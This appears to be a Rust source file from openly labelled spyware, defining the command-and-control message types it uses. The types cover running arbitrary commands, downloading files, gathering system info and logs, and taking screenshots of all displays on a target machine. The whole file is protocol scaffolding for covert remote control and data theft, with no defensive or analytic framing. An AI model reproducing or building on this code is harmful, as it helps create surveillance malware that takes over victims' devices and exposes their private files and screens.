use serde::{Deserialize, Serialize};

pub const MESSAGE_LENGTH_SIZE: usize = 4;
pub const MESSAGE_HEADER_LENGTH: usize = MESSAGE_LENGTH_SIZE;

#[derive(Serialize, Deserialize, Debug)]
pub struct ErrorInfo {
    pub raw_os_error: i32,
    pub as_string: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandRequest {
    pub command: String,
    pub async_run: bool,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct RunCommandResponse {
    pub output: String,
    pub error_info: Option<ErrorInfo>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct DownloadFileRequest {
    pub path: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct DownloadFileResponse {
    pub file_data: Vec<u8>,
    pub error_info: Option<ErrorInfo>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetBasicInfoRequest {
    // For now we don't really have anything to insert here
    pub placeholder: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum OperatingSystem {
    Windows,
    Linux,
    FreeBSD,
    MacOS,
    IOS,
    Android,
    Unknown,
}

#[allow(non_camel_case_types)]
#[derive(Debug, Serialize, Deserialize)]
pub enum Architecture {
    x86,
    x86_64,
    mips,
    powerpc,
    powerpc64,
    arm,
    aarch64,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum PointerWidth {
    Bit32,
    Bit64,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetBasicInfoResponse {
    // Spyware version
    pub version: u32,
    pub arch: Architecture,
    pub target_os: OperatingSystem,
    pub operating_system_version: String,
    pub pointer_width: PointerWidth,
    pub error_info: Option<ErrorInfo>,
}

/// Get logs
#[derive(Serialize, Deserialize, Debug)]
pub struct GetLogsRequest {}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetLogsResponse {
    pub logs: Vec<String>,
    pub error_info: Option<ErrorInfo>,
}

/// Get screenshot
#[derive(Serialize, Deserialize, Debug)]
pub struct GetScreenshotRequest {}

#[derive(Serialize, Deserialize, Debug)]
pub struct DisplayScreenshot {
    pub buffer: Vec<u8>,
    pub width: usize,
    pub height: usize,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetScreenshotResponse {
    pub displays_screenshots: Vec<DisplayScreenshot>,
    pub error_info: Option<ErrorInfo>,
}

#[derive(Serialize, Deserialize, Debug)]
pub enum Message {
    RunCommandRequest(RunCommandRequest),
    RunCommandResponse(RunCommandResponse),
    DownloadFileRequest(DownloadFileRequest),
    DownloadFileResponse(DownloadFileResponse),
    GetBasicInfoRequest(GetBasicInfoRequest),
    GetBasicInfoResponse(GetBasicInfoResponse),
    GetLogsRequest(GetLogsRequest),
    GetLogsResponse(GetLogsResponse),
    GetScreenshotRequest(GetScreenshotRequest),
    GetScreenshotResponse(GetScreenshotResponse),
}
